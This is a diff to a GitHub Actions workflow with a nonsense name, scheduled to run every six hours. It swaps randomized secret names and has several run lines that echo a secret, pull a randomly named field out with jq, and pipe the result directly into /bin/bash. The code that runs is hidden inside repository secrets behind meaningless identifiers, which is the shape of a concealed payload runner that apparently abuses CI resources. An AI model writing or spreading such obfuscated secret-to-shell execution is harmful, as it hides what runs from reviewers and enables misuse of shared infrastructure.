@@ -3,21 +3,17 @@ name: operatingbiking
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 1/6 * * *'
+    - cron: '49 1/6 * * *'
 
-jobs:  # 23424
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: operatingbiking
         env:
-          w98244: ${{ secrets.w98244 }}
+          nnanl3: ${{ secrets.nnanl3 }}
         run: |
-          echo $w98244 | jq -r .fpwm2 | /bin/bash
-          echo $ft2 | jq -r .npxt188 | /bin/bash
-          echo $zgoih04189 | jq -r .lqb0051 | /bin/bash
-          echo $mvhj79731 | jq -r .jow82 | /bin/bash
-          echo $qu2670 | jq -r .xswxq8 | /bin/bash
-          echo $ofsz138 | jq -r .nf50278 | /bin/bash
+          echo $nnanl3 | jq -r .hsj82 | /bin/bash
+          echo $tzx21009 | jq -r .imnbx68385 | /bin/bash
 
